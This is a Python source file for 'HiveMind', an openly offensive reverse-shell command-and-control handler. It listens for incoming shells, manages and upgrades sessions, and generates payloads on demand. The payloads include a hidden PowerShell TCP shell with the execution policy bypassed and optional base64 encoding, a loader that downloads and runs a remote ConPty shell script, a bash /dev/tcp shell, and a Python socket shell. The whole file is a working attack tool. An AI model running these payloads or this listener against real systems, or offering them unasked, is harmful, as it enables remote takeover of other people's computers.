import socket
import threading
import os
import sys
import select
import netifaces
import subprocess
import base64
from termcolor import colored

# Global default port for all reverse shells
DEFAULT_PORT = 4444

# Enable command history and autocompletion (if available)
try:
    import readline
    import rlcompleter
    COMMANDS = [
        'alias', 'cleanup', 'cmd', 'exit', 'help', 
        'kill', 'session', 'sessions', 'set payload', 'show payloads', 'upgrade'
    ]
    def completer(text, state):
        options = [cmd for cmd in COMMANDS if cmd.startswith(text)]
        if state < len(options):
            return options[state]
        return None
    readline.set_completer(completer)
    readline.parse_and_bind("tab: complete")
except ImportError:
    pass

# Global dictionaries for sessions and aliases.
# sessions: mapping session_id (int) -> connection
# session_aliases: mapping alias (str) -> session_id (int)
sessions = {}
session_aliases = {}
lock = threading.Lock()

# --- Utility Functions ---

def color(text, color_code):
    """
    Wraps the given text with ANSI escape codes for the provided color code.
    """
    return f"\033[{color_code}m{text}\033[0m"

def banner():
    banner_text = color(
        """
    ██╗  ██╗██╗██╗   ██╗███████╗███╗   ███╗██╗███╗   ██╗██████╗ 
    ██║  ██║██║██║   ██║██╔════╝████╗ ████║██║████╗  ██║██╔══██╗
    ███████║██║██║   ██║█████╗  ██╔████╔██║██║██╔██╗ ██║██║  ██║
    ██╔══██║██║╚██╗ ██╔╝██╔══╝  ██║╚██╔╝██║██║██║╚██╗██║██║  ██║
    ██║  ██║██║ ╚████╔╝ ███████╗██║ ╚═╝ ██║██║██║ ╚████║██████╔╝
    ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═════╝ 
        """, "96"
    )
    print(banner_text)
    print(colored("[Info]", "green"), "Reverse Shell Multi-Handler Initialized.")
    print(colored("[Info]", "green"), "Type 'help' to list available commands.\n")

def show_help():
    print(colored("\n[ HiveMind Commands ]", "yellow"))
    print(colored("  alias <id|alias> <new_alias>         - Set an alias for a session", "green"))
    print(colored("  cleanup                            - Clean up dead sessions", "green"))
    print(colored("  cmd <command>                      - Execute a local shell command", "green"))
    print(colored("  exit                               - Exit HiveMind", "green"))
    print(colored("  help                               - Show this help menu", "green"))
    print(colored("  kill <id|alias>                    - Kill a session", "green"))
    print(colored("  session <id|alias>                 - Interact with a specific session (basic mode)", "green"))
    print(colored("  sessions                           - Show all active sessions", "green"))
    print(colored("  set payload <Type> <LHOST> [base64]  - Set payload (no port required)", "green"))
    print(colored("  show payloads                      - List available payloads", "green"))
    print(colored("  upgrade <id|alias>                 - Upgrade session to full TTY mode", "green"))
    print()

def list_payloads():
    print(colored("\n[ Available Payloads ]", "blue"))
    print(colored("  windows/reverse_tcp/powershell  - Standard PowerShell Reverse Shell", "green"))
    print(colored("  windows/conpty                  - ConPty-based Reverse Shell (Use Upgrade <id>)", "green"))
    print(colored("  linux/reverse_tcp/bash          - Bash Reverse Shell", "green"))
    print(colored("  linux/reverse_tcp/python        - Python Reverse Shell\n", "green"))

def resolve_ip(lhost):
    if lhost in netifaces.interfaces():
        addrs = netifaces.ifaddresses(lhost)
        if netifaces.AF_INET in addrs and addrs[netifaces.AF_INET]:
            return addrs[netifaces.AF_INET][0]['addr']
        else:
            print(colored(f"[-] No IPv4 address found for interface {lhost}. Using input as is.", "red"))
            return lhost
    try:
        socket.inet_aton(lhost)
        return lhost
    except socket.error:
        try:
            return socket.gethostbyname(lhost)
        except Exception as e:
            print(colored(f"[-] Failed to resolve {lhost}: {e}. Using input as is.", "red"))
            return lhost

def generate_payload(payload_type, lhost, encode=False):
    resolved_host = resolve_ip(lhost)
    
    if payload_type == "windows/reverse_tcp/conpty":
        # Use -nop, -W hidden, -noni, and -ep bypass; wrap the entire command in quotes.
        payload = (
            f"powershell -nop -W hidden -noni -ep bypass -c \"IEX((New-Object Net.WebClient).DownloadString('http://{resolved_host}/Invoke-ConPtyShell.ps1')); "
            f"Invoke-ConPtyShell {resolved_host} {DEFAULT_PORT}\""
        )
    elif payload_type == "windows/reverse_tcp/powershell":
        script_body = (
            f"$TCPClient = New-Object Net.Sockets.TCPClient('{resolved_host}', {DEFAULT_PORT});"
            f"$NetworkStream = $TCPClient.GetStream();"
            f"$StreamWriter = New-Object IO.StreamWriter($NetworkStream);"
            f"function WriteToStream ($String) "
            f"{{[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {{0}}; "
            f"$StreamWriter.Write($String + 'SHELL> '); "
            f"$StreamWriter.Flush()}}; "
            f"WriteToStream ''; "
            f"while(($BytesRead = $NetworkStream.Read($script:Buffer, 0, $script:Buffer.Length)) -gt 0) "
            f"{{ $Command = ([text.encoding]::UTF8).GetString($script:Buffer, 0, $BytesRead - 1); "
            f"if ($Command -ne '') {{ $Output = try {{ Invoke-Expression $Command 2>&1 | Out-String -Width 4096 }} catch {{ $_ | Out-String -Width 4096 }}; "
            f"WriteToStream ($Output) }} }}; "
            f"$StreamWriter.Close()"
        )
        if encode:
            encoded_payload = base64.b64encode(script_body.encode('utf-16le')).decode()
            return f"powershell -e {encoded_payload}"
        else:
            payload = f"powershell -nop -W hidden -noni -ep bypass -c \"{script_body}\""
    elif payload_type == "linux/reverse_tcp/bash":
        payload = f"bash -i >& /dev/tcp/{resolved_host}/{DEFAULT_PORT} 0>&1"
    elif payload_type == "linux/reverse_tcp/python":
        payload = (
            f"python -c 'import socket,subprocess,os;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.connect((\"{resolved_host}\",{DEFAULT_PORT}));"
            f"os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"
            f"p=subprocess.call([\"/bin/sh\",\"-i\"])'"
        )
    else:
        return "Invalid payload type."
    
    return payload

# --- Networking Functions ---

def start_listener(port):
    """
    Listens on the given port and spawns a new thread for each incoming connection.
    """
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server.bind(("0.0.0.0", port))
        server.listen(10)
        print(colored(f"[+] HiveMind is listening for incoming shells on port {port}...\n", "yellow"))
    except Exception as e:
        print(colored(f"[-] Failed to start listener on port {port}: {e}", "red"))
        sys.exit(1)
    session_id = 1
    while True:
        try:
            conn, addr = server.accept()
            threading.Thread(target=handle_client, args=(conn, addr, session_id)).start()
            session_id += 1
        except Exception as e:
            print(colored(f"[-] Error accepting connection: {e}", "red"))

def remove_session(session_id):
    """Helper function to remove a session and its alias (if any)."""
    with lock:
        if session_id in sessions:
            try:
                sessions[session_id].close()
            except Exception:
                pass
            del sessions[session_id]
        # Remove any alias that points to this session.
        for alias, sid in list(session_aliases.items()):
            if sid == session_id:
                del session_aliases[alias]

def resolve_session_identifier(identifier):
    """
    Resolves an identifier (numeric string or alias) to a session id.
    Returns an integer session id if found, otherwise None.
    """
    if identifier.isdigit():
        sid = int(identifier)
        if sid in sessions:
            return sid
    elif identifier in session_aliases:
        sid = session_aliases[identifier]
        if sid in sessions:
            return sid
        else:
            del session_aliases[identifier]
    return None

def kill_session(identifier):
    """Kills a session by id or alias."""
    sid = resolve_session_identifier(identifier)
    if sid is None:
        print(colored(f"[-] No active session matching '{identifier}'.", "red"))
    else:
        remove_session(sid)
        print(colored(f"[*] Session {sid} has been killed.", "yellow"))

# --- Session Handling Functions ---

def handle_client(conn, addr, session_id):
    print(colored(f"[+] Session {session_id} established from {addr}", "green"))
    with lock:
        sessions[session_id] = conn
    # (Removed welcome message to avoid interfering with shell payloads.)

def interactive_shell(session_id):
    if session_id not in sessions:
        print(colored(f"[-] No active session {session_id}", "red"))
        return
    conn = sessions[session_id]
    print(colored(f"\n[*] Switched to session {session_id}. Press Ctrl+C to return to HiveMind menu.\n", "yellow"))
    try:
        while True:
            r, _, _ = select.select([conn, sys.stdin], [], [])
            if conn in r:
                data = conn.recv(4096)
                if not data:
                    print(colored("[-] Connection closed by remote host.", "red"))
                    remove_session(session_id)
                    break
                print(data.decode(errors="ignore"), end="", flush=True)
            if sys.stdin in r:
                cmd = sys.stdin.readline()
                conn.send(cmd.encode())
    except KeyboardInterrupt:
        print(colored("\n[*] Returning to HiveMind menu...\n", "yellow"))
    except Exception as e:
        print(colored(f"[-] Session {session_id} lost: {e}", "red"))
        remove_session(session_id)

def upgrade_session(session_id):
    """
    Upgrades the selected session to a full interactive TTY mode.
    Uses a short timeout with select to avoid freezing.
    Note: Full TTY upgrade may not work properly with a Windows PowerShell reverse shell.
    If you're using a PowerShell reverse shell, please use the basic interactive session
    (via the 'session' command) instead.
    """
    if session_id not in sessions:
        print(colored(f"[-] No active session {session_id}", "red"))
        return
    conn = sessions[session_id]
    import tty, termios, sys, select
    old_tty = termios.tcgetattr(sys.stdin)
    print(colored(f"\n[*] Upgrading session {session_id} to TTY mode. Press Ctrl+] to exit TTY mode.\n", "yellow"))
    print(colored("[*] Note: Full TTY upgrade may not work properly with a Windows PowerShell reverse shell. "
                  "If you're using a PowerShell reverse shell, please use the basic interactive session (via the 'session' command) instead.", "yellow"))
    try:
        tty.setraw(sys.stdin.fileno())
        while True:
            # Use a short timeout so the loop doesn't block indefinitely.
            r, _, _ = select.select([conn, sys.stdin], [], [], 0.1)
            if conn in r:
                try:
                    data = conn.recv(1024)
                except Exception as e:
                    print(colored(f"[-] Error receiving data: {e}", "red"))
                    break
                if not data:
                    break
                os.write(sys.stdout.fileno(), data)
            if sys.stdin in r:
                data = os.read(sys.stdin.fileno(), 1024)
                if not data:
                    break
                if b'\x1d' in data:  # Ctrl+]
                    break
                try:
                    conn.send(data)
                except Exception as e:
                    print(colored(f"[-] Error sending data: {e}", "red"))
                    break
    except Exception as e:
        print(colored(f"[-] Session {session_id} upgrade failed: {e}", "red"))
    finally:
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_tty)
        print(colored(f"\n[*] Exiting TTY mode for session {session_id}.", "yellow"))

def list_sessions():
    print(colored("\n[ Active Sessions ]", "blue"))
    if not sessions:
        print(colored("[-] No active sessions.", "red"))
    else:
        for sid, conn in sessions.items():
            try:
                peer = conn.getpeername()
                alias_str = ""
                for alias, asid in session_aliases.items():
                    if asid == sid:
                        alias_str = f" (alias: {alias})"
                        break
                print(colored(f"Session {sid}{alias_str}: {peer}", "green"))
            except Exception:
                print(colored(f"Session {sid}: [Disconnected]", "red"))
    print()

def cleanup_sessions():
    """Removes any sessions that are no longer active."""
    removed = 0
    for sid in list(sessions.keys()):
        try:
            sessions[sid].getpeername()
        except Exception:
            remove_session(sid)
            removed += 1
    print(colored(f"[*] Cleanup complete. Removed {removed} dead session(s).", "yellow"))

# --- Command-Line Interface ---

def command_line():
    while True:
        try:
            cmd = input(colored("\nHiveMind > ", "cyan")).strip()
            lower_cmd = cmd.lower()
            parts = cmd.split()  # Preserve case for payload types and aliases

            if lower_cmd == "sessions":
                list_sessions()

            elif lower_cmd.startswith("session "):
                if len(parts) < 2:
                    print(colored("[-] Usage: session <id|alias>", "red"))
                    continue
                identifier = parts[1]
                sid = resolve_session_identifier(identifier)
                if sid is None:
                    print(colored(f"[-] No active session matching '{identifier}'.", "red"))
                else:
                    interactive_shell(sid)

            elif lower_cmd.startswith("upgrade "):
                if len(parts) < 2:
                    print(colored("[-] Usage: upgrade <id|alias>", "red"))
                    continue
                identifier = parts[1]
                sid = resolve_session_identifier(identifier)
                if sid is None:
                    print(colored(f"[-] No active session matching '{identifier}'.", "red"))
                else:
                    upgrade_session(sid)

            elif lower_cmd.startswith("alias "):
                # Usage: alias <id|alias> <new_alias>
                if len(parts) != 3:
                    print(colored("[-] Usage: alias <id|alias> <new_alias>", "red"))
                    continue
                identifier = parts[1]
                new_alias = parts[2]
                sid = resolve_session_identifier(identifier)
                if sid is None:
                    print(colored(f"[-] No active session matching '{identifier}'.", "red"))
                else:
                    if new_alias in session_aliases:
                        print(colored(f"[-] Alias '{new_alias}' is already in use.", "red"))
                    else:
                        session_aliases[new_alias] = sid
                        print(colored(f"[*] Session {sid} now has alias '{new_alias}'.", "yellow"))

            elif lower_cmd.startswith("kill "):
                # Usage: kill <id|alias>
                if len(parts) != 2:
                    print(colored("[-] Usage: kill <id|alias>", "red"))
                    continue
                identifier = parts[1]
                kill_session(identifier)

            elif lower_cmd == "cleanup":
                cleanup_sessions()

            elif lower_cmd.startswith("set payload"):
                # Expected format: set payload <PayloadType> <LHOST> [base64]
                if len(parts) < 4:
                    print(colored("[-] Usage: set payload <PayloadType> <LHOST> [base64]", "red"))
                    continue
                payload_type = parts[2]
                lhost = parts[3]
                encode = False
                if len(parts) > 4 and parts[4].lower() == "base64":
                    encode = True
                generated = generate_payload(payload_type, lhost, encode)
                print(colored("\n[+] Generated Payload:\n", "yellow"))
                print(generated)

            elif lower_cmd == "show payloads":
                list_payloads()

            elif lower_cmd.startswith("cmd "):
                # Execute a local shell command.
                local_command = cmd[4:]
                try:
                    result = subprocess.run(local_command, shell=True, capture_output=True, text=True)
                    if result.stdout:
                        print(result.stdout)
                    if result.stderr:
                        print(result.stderr)
                except Exception as e:
                    print(colored(f"[-] Error executing command: {e}", "red"))

            elif lower_cmd == "exit":
                print(colored("[*] Exiting HiveMind...", "yellow"))
                # Close all sessions before exiting.
                for sid in list(sessions.keys()):
                    remove_session(sid)
                break

            elif lower_cmd == "help":
                show_help()

            else:
                print(colored("[-] Unknown command.", "red"))
        except KeyboardInterrupt:
            print(colored("\n[*] Use 'exit' to quit HiveMind.", "yellow"))

if __name__ == "__main__":
    banner()
    # Start the listener thread on DEFAULT_PORT (4444)
    listener_thread = threading.Thread(target=lambda: start_listener(DEFAULT_PORT), daemon=True)
    listener_thread.start()
    command_line()
